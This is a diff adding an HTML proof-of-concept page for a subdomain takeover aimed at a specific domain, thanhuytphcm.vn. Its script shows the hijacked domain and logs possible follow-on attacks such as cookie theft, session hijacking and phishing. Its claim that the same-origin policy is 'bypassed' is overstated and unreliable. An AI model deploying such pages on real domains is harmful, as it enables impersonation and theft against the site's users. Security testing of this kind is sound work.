@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Subdomain Takeover PoC</title>
+    <style>
+        body { font-family: Arial; padding: 20px; background: #f0f0f0; }
+        .success { color: green; font-weight: bold; }
+        .info { background: white; padding: 15px; margin: 10px 0; border-left: 4px solid #007cba; }
+    </style>
+</head>
+<body>
+    <h1 class="success">🎯 Subdomain Takeover Successful!</h1>
+    <div class="info">
+        <p><strong>Domain:</strong> <span id="domain"></span></p>
+        <p><strong>URL:</strong> <span id="url"></span></p>
+        <p><strong>Timestamp:</strong> <span id="time"></span></p>
+    </div>
+    
+    <script>
+        document.getElementById('domain').textContent = document.domain;
+        document.getElementById('url').textContent = window.location.href;
+        document.getElementById('time').textContent = new Date().toISOString();
+        
+        console.log('🎯 Subdomain takeover successful on:', document.domain);
+        
+        // PoC: Demonstrate same-origin access capability
+        if (document.domain.includes('thanhuytphcm.vn')) {
+            console.log('✅ Same-origin policy bypassed - can access parent domain resources');
+            
+            // Log potential attack vectors
+            console.log('🚨 Potential attack vectors:');
+            console.log('- Cookie theft from *.thanhuytphcm.vn');
+            console.log('- Session hijacking');
+            console.log('- Phishing with trusted domain');
+            console.log('- CSRF attacks');
+        }
+    </script>
+</body>
+</html>
